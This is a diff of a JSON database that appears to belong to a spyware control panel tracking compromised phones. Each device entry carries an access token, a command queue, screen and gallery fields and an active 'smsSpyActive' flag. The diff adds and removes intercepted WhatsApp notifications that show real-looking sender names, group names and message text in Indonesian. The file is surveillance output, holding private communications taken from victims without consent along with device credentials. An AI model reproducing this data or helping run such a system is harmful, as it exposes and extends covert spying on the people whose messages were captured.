@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781625546,
+    "lastSeen": 1776781628692,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (7 pesan): ~ JB RENZ SMITH KALBAR",
+        "content": "ambil",
+        "time": "21/04 21:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781629127
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2941 pesan dari 19 chat",
+        "time": "21/04 21:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781626047
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎JB || RULZ STORE KALBAR (6 pesan): ~ ada",
@@ -10312,22 +10328,6 @@
         "time": "21/04 20:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779978045
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Imam & Imam",
-        "content": "Telepon video grup berlangsung",
-        "time": "21/04 20:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779976561
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Imam & Imam",
-        "content": "Telepon video grup berlangsung",
-        "time": "21/04 20:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779976542
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781620965,
+    "lastSeen": 1776781627006,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781624510,
+    "lastSeen": 1776781627571,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
